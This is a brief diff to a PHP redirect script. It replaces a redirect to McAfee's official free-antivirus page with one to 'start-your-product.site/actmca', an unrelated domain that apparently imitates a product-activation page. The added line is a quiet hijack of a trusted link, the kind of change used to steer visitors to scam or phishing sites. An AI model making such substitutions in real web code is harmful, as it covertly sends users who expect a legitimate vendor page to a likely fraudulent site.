@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.mcafee.com/en-us/antivirus/free.html");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
